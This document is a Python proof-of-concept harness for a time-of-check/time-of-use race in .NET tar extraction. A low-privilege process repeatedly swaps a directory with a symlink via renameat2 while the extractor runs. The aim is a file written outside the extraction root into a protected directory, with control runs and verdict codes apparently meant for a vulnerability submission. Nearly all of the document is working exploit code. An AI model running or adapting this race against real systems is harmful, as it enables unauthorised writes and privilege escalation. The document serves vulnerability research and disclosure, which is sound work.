#!/usr/bin/env python3
from __future__ import annotations

import argparse
import ctypes
import hashlib
import io
import json
import multiprocessing as mp
import os
import shutil
import stat
import subprocess
import tarfile
import time
import uuid
from pathlib import Path
from typing import Any

AT_FDCWD = -100
RENAME_EXCHANGE = 2
LOW_UID = 65534
LOW_GID = 65534


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def make_setup_tar(path: Path) -> None:
    with tarfile.open(path, "w", format=tarfile.PAX_FORMAT) as archive:
        entry = tarfile.TarInfo("outer/")
        entry.type = tarfile.DIRTYPE
        entry.mode = 0o777
        entry.uid = 0
        entry.gid = 0
        entry.mtime = int(time.time())
        archive.addfile(entry)


def make_payload_tar(path: Path, payload: bytes) -> None:
    with tarfile.open(path, "w", format=tarfile.PAX_FORMAT) as archive:
        entry = tarfile.TarInfo("outer/inner/marker.txt")
        entry.mode = 0o644
        entry.uid = 0
        entry.gid = 0
        entry.mtime = int(time.time())
        entry.size = len(payload)
        archive.addfile(entry, io.BytesIO(payload))


def drop_privileges() -> None:
    os.setgroups([])
    os.setgid(LOW_GID)
    os.setuid(LOW_UID)


def low_setup(outer: Path, outside: Path, write_fd: int) -> None:
    result: dict[str, Any] = {}
    try:
        drop_privileges()
        inner = outer / "inner"
        swap = outer / "swap"
        inner.mkdir()
        swap.symlink_to(outside, target_is_directory=True)
        direct_denied = False
        try:
            (outside / "direct-low-write.txt").write_text("must-not-write", encoding="utf-8")
        except (PermissionError, OSError):
            direct_denied = True
        result = {
            "uid": os.getuid(),
            "gid": os.getgid(),
            "inner_created": inner.is_dir(),
            "swap_is_symlink": swap.is_symlink(),
            "direct_outside_write_denied": direct_denied,
        }
    except BaseException as exc:  # evidence capture
        result = {"error": repr(exc)}
    finally:
        os.write(write_fd, json.dumps(result).encode())
        os.close(write_fd)
        os._exit(0)


def create_low_layout(outer: Path, outside: Path) -> dict[str, Any]:
    read_fd, write_fd = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(read_fd)
        low_setup(outer, outside, write_fd)
    os.close(write_fd)
    raw = b""
    while True:
        block = os.read(read_fd, 65536)
        if not block:
            break
        raw += block
    os.close(read_fd)
    _, wait_status = os.waitpid(pid, 0)
    result = json.loads(raw.decode() or "{}")
    result["wait_status"] = wait_status
    return result


def toggler(inner: str, swap: str, stop: mp.Event, counter: mp.Value, errors: mp.Queue) -> None:
    try:
        drop_privileges()
        libc = ctypes.CDLL(None, use_errno=True)
        renameat2 = libc.renameat2
        renameat2.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_uint]
        renameat2.restype = ctypes.c_int
        old = os.fsencode(inner)
        new = os.fsencode(swap)
        local_count = 0
        while not stop.is_set():
            if renameat2(AT_FDCWD, old, AT_FDCWD, new, RENAME_EXCHANGE) != 0:
                err = ctypes.get_errno()
                raise OSError(err, os.strerror(err))
            local_count += 1
            if local_count % 1000 == 0:
                with counter.get_lock():
                    counter.value = local_count
        with counter.get_lock():
            counter.value = local_count
    except BaseException as exc:  # evidence capture
        errors.put(repr(exc))


def invoke(command: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, text=True, capture_output=True, check=False)


def extract_once(dotnet: Path, helper: Path, archive: Path, destination: Path) -> subprocess.CompletedProcess[str]:
    return invoke([str(dotnet), str(helper), "extract-once", str(archive), str(destination)])


def extract_loop(
    dotnet: Path,
    helper: Path,
    archive: Path,
    destination: Path,
    outside_marker: Path,
    payload: str,
    iterations: int,
) -> subprocess.CompletedProcess[str]:
    return invoke([
        str(dotnet), str(helper), "extract-loop", str(archive), str(destination),
        str(outside_marker), payload, str(iterations),
    ])


def serialise_case(case: dict[str, Any]) -> dict[str, Any]:
    return {key: str(value) if isinstance(value, Path) else value for key, value in case.items()}


def prepare_case(root: Path, dotnet: Path, helper: Path, payload: str) -> dict[str, Any]:
    destination = root / "dest"
    outside = root / "protected-outside"
    destination.mkdir(parents=True, mode=0o755)
    outside.mkdir(mode=0o700)
    os.chmod(destination, 0o755)
    os.chmod(outside, 0o700)
    setup_tar = root / "setup.tar"
    payload_tar = root / "payload.tar"
    make_setup_tar(setup_tar)
    make_payload_tar(payload_tar, payload.encode())

    old_umask = os.umask(0)
    try:
        setup_run = extract_once(dotnet, helper, setup_tar, destination)
    finally:
        os.umask(old_umask)

    outer = destination / "outer"
    outer_mode = stat.S_IMODE(outer.stat().st_mode) if outer.exists() else None
    low_layout = create_low_layout(outer, outside) if outer.exists() else {"error": "outer missing"}
    return {
        "dest": destination,
        "outside": outside,
        "outer": outer,
        "setup_tar": setup_tar,
        "payload_tar": payload_tar,
        "setup_run": {
            "returncode": setup_run.returncode,
            "stdout": setup_run.stdout,
            "stderr": setup_run.stderr,
        },
        "outer_mode": outer_mode,
        "low_layout": low_layout,
        "setup_tar_sha256": sha256(setup_tar),
        "payload_tar_sha256": sha256(payload_tar),
    }


def run_control(base: Path, dotnet: Path, helper: Path) -> dict[str, Any]:
    root = base / "control-no-race"
    root.mkdir()
    payload = f"CONTROL-{uuid.uuid4().hex}"
    case = prepare_case(root, dotnet, helper, payload)
    outside_marker = case["outside"] / "marker.txt"
    run = extract_loop(dotnet, helper, case["payload_tar"], case["dest"], outside_marker, payload, 200)
    inside_marker = case["dest"] / "outer" / "inner" / "marker.txt"
    return {
        "setup": serialise_case(case),
        "extract": {"returncode": run.returncode, "stdout": run.stdout, "stderr": run.stderr},
        "inside_exact": inside_marker.exists() and inside_marker.read_text(encoding="utf-8") == payload,
        "outside_exists": outside_marker.exists(),
    }


def run_attack_trial(
    base: Path,
    index: int,
    dotnet: Path,
    helper: Path,
    iterations: int,
) -> dict[str, Any]:
    root = base / f"attack-{index:02d}"
    root.mkdir()
    payload = f"ATTACK-{index}-{uuid.uuid4().hex}"
    case = prepare_case(root, dotnet, helper, payload)
    outside_marker = case["outside"] / "marker.txt"
    stop = mp.Event()
    counter = mp.Value("Q", 0)
    errors: mp.Queue = mp.Queue()
    process = mp.Process(
        target=toggler,
        args=(str(case["outer"] / "inner"), str(case["outer"] / "swap"), stop, counter, errors),
    )
    process.start()
    time.sleep(0.05)
    started = time.monotonic()
    run = extract_loop(dotnet, helper, case["payload_tar"], case["dest"], outside_marker, payload, iterations)
    elapsed = time.monotonic() - started
    stop.set()
    process.join(5)
    if process.is_alive():
        process.terminate()
        process.join(5)
    child_errors: list[str] = []
    while not errors.empty():
        child_errors.append(errors.get())

    outside_exact = outside_marker.exists() and outside_marker.read_text(encoding="utf-8") == payload
    outside_stat = None
    if outside_marker.exists():
        info = outside_marker.stat()
        outside_stat = {
            "uid": info.st_uid,
            "gid": info.st_gid,
            "mode": stat.S_IMODE(info.st_mode),
            "size": info.st_size,
        }
    return {
        "index": index,
        "setup": serialise_case(case),
        "extract": {"returncode": run.returncode, "stdout": run.stdout, "stderr": run.stderr},
        "elapsed_seconds": elapsed,
        "toggles": counter.value,
        "toggler_exitcode": process.exitcode,
        "toggler_errors": child_errors,
        "outside_exact": outside_exact,
        "outside_stat": outside_stat,
        "payload": payload,
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--dotnet", required=True)
    parser.add_argument("--dll", required=True)
    parser.add_argument("--work", required=True)
    parser.add_argument("--iterations", type=int, default=30000)
    parser.add_argument("--trials", type=int, default=3)
    args = parser.parse_args()
    if os.geteuid() != 0:
        raise SystemExit("must run as root")

    dotnet = Path(args.dotnet).resolve()
    helper = Path(args.dll).resolve()
    work = Path(args.work).resolve()
    shutil.rmtree(work, ignore_errors=True)
    work.mkdir(parents=True)

    version = invoke([str(dotnet), "--info"])
    control = run_control(work, dotnet, helper)
    attacks = [run_attack_trial(work, i + 1, dotnet, helper, args.iterations) for i in range(args.trials)]
    positive_count = sum(1 for trial in attacks if trial["outside_exact"])
    control_pass = control["inside_exact"] and not control["outside_exists"] and control["extract"]["returncode"] == 0
    low_layouts = [trial["setup"]["low_layout"] for trial in attacks]
    low_setup_pass = all(
        layout.get("uid") == LOW_UID
        and layout.get("inner_created") is True
        and layout.get("swap_is_symlink") is True
        and layout.get("direct_outside_write_denied") is True
        for layout in low_layouts
    )
    togglers_pass = all(trial["toggles"] > 0 and not trial["toggler_errors"] for trial in attacks)
    setup_modes = [trial["setup"]["outer_mode"] for trial in attacks]

    result: dict[str, Any] = {
        "schema": "dotnet-tar-postfix-toctou-runtime-v2",
        "runtime": {
            "dotnet_info": version.stdout,
            "dotnet_info_stderr": version.stderr,
            "dotnet_path": str(dotnet),
            "helper_sha256": sha256(helper),
        },
        "control": control,
        "attacks": attacks,
        "summary": {
            "positive_trials": positive_count,
            "required_positive_trials": args.trials,
            "control_pass": control_pass,
            "low_setup_and_direct_denial_pass": low_setup_pass,
            "togglers_pass": togglers_pass,
            "outer_modes": setup_modes,
        },
    }

    if positive_count == args.trials and control_pass and low_setup_pass and togglers_pass:
        result["verdict"] = "RUNTIME_POSITIVE_OUTSIDE_ROOT_WRITE_TOCTOU"
        exit_code = 42
    elif positive_count > 0 and control_pass and low_setup_pass and togglers_pass:
        result["verdict"] = "PARTIAL_RUNTIME_POSITIVE_NOT_SUBMISSION_READY"
        exit_code = 41
    elif control_pass and low_setup_pass and togglers_pass:
        result["verdict"] = "RUNTIME_NEGATIVE_OR_RACE_NOT_WON"
        exit_code = 0
    else:
        result["verdict"] = "ENVIRONMENT_OR_CONTROL_FAILURE"
        exit_code = 30

    (work / "RESULT.json").write_text(json.dumps(result, indent=2), encoding="utf-8")
    print(json.dumps({"verdict": result["verdict"], **result["summary"]}, indent=2))
    return exit_code


if __name__ == "__main__":
    raise SystemExit(main())
